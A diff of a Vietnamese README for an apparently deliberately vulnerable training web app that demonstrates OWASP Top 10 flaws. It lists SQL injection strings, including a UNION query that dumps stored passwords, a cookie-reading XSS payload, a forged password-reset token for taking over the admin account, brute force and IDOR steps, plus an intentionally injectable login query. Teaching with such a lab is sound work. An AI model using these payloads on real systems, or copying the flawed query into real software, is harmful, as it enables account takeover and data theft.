@@ -19,7 +19,7 @@ Mục đích: Minh hoạ OWASP Top 10 (A1–A6) trong môi trường thực tế
 
 ### Điểm tấn công
 
-**1. Login form** (`POST /login`) — `routes/auth.js:14`
+**1. Login form** (`POST /login`) — `routes/auth.js:16`
 
 ```js
 const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
@@ -102,7 +102,7 @@ app.use(session({
 }));
 ```
 
-Attacker biết secret `devsecret` có thể dùng `node-cookie-signature` để forge cookie `connect.sid` hợp lệ, impersonate bất kỳ user_id nào.
+**Lưu ý:** Cookie được sign bằng `keygrip` library (không phải HMAC đơn giản). Việc forge cookie đòi hỏi hiểu rõ thuật toán signing của keygrip. Các attack vector thực tế hiệu quả hơn được liệt kê bên dưới.
 
 ### Lỗ hổng 2 — Brute force không bị chặn
 
@@ -153,9 +153,9 @@ Mật khẩu được so sánh trực tiếp với giá trị lưu trong DB — 
 
 ### Cách thực hiện
 
-1. Vào `/login` → nhập sai → quan sát SQL query hiện ra
-2. Thử `admin'--` (bypass SQLi) → vào được dashboard với role admin
-3. Vào `/vuln/auth` → xem session cookie, secret, thử brute force bằng wordlist
+1. **SQLi bypass (hiệu quả nhất):** Vào `/login` → Username: `admin'--` → Password: (bất kỳ) → Login thành công với quyền admin
+2. **Brute force:** Vào `/vuln/auth` → dùng wordlist → click từng password → khi `success: true` là crack xong
+3. **Forgot password token predictable:** Tính `base64('admin')` = `YWRtaW4=` → truy cập `/reset-password?token=YWRtaW4=` → đổi password admin
 
 ---
 
@@ -368,11 +368,11 @@ Vào `/vuln/data` → thấy bảng toàn bộ users kèm password plaintext.
 | A1 | `/login` | `admin'--` | `routes/auth.js:14` |
 | A1 | Nav search bar | `' UNION SELECT id,username,password,role,email,balance FROM users--` | `routes/user.js:214` |
 | A1 | `/vuln/sqli` | `' OR '1'='1` | `routes/vuln.js:23` |
-| A2 | `/vuln/auth` | Brute force wordlist | `routes/vuln.js:48-60` |
+| A2 | `/vuln/auth/bruteforce` | Brute force wordlist | `routes/vuln.js:48-61` |
 | A2 | `/login` | `admin'--` (bypass) | `routes/auth.js:14` |
 | A2 | `/forgot-password` | `btoa('admin')` → forge reset link | `routes/auth.js` |
 | A2 | `/reset-password?token=YWRtaW4=` | Đổi password admin không cần email | `routes/auth.js` |
-| A3 | `/vuln/xss` → `/user/reviews` | `<script>alert(document.cookie)</script>` | `routes/vuln.js:72`, `views/user/reviews.ejs` |
+| A3 | `/vuln/xss` → `/user/reviews` | `<script>alert(document.cookie)</script>` | `routes/vuln.js:68-77`, `views/user/reviews.ejs` |
 | A4 | `/user/order/:id` | Đổi ID trên URL | `routes/user.js:122` |
 | A5 | `/vuln/config` | _(chỉ cần đăng nhập)_ | `routes/vuln.js:92` |
 | A5 | `/debug` | _(không cần login)_ | `server.js:143` |
